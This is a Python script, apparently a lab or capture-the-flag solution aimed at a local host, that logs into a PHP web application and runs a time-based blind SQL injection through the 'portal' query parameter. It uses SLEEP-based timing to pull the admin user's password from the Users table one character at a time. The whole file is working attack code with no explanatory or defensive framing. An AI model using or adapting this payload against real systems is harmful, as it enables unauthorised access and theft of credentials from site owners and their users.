import requests
import time
import string

def login(username, password):
    payload = {
        'user': username,
        'pass': password
    }
    r = requests.post("http://{}/login.php".format(HOST), data=payload, allow_redirects=False)
    session = r.headers['Set-Cookie'][10:36]
    return session

def lookup(session):
    result = ""
    print("[+] Starting attack")
    for i in range(1, 32):
        for c in string.printable[:-6]:
            payload = {
                'portal': "'OR(SELECT(IF(ORD(SUBSTR((SELECT password FROM Users WHERE username='admin'),{},1))={},SLEEP(1),'')))#".format(i, ord(c))
            }
            cookies = {'PHPSESSID': session}
            start = time.time()
            r = requests.get("http://{}/index.php".format(HOST), cookies=cookies, params=payload)
            end = time.time()
            if end - start > 1.0:
                result += c
                print("[+] Found: {}".format(c))
                break
        else:
            print("[+] End of search")
            break
    print("[+] Result: {}".format(result))

if __name__ == '__main__':
    HOST = "127.0.0.1"
    session = login("taro", "password123")
    lookup(session)
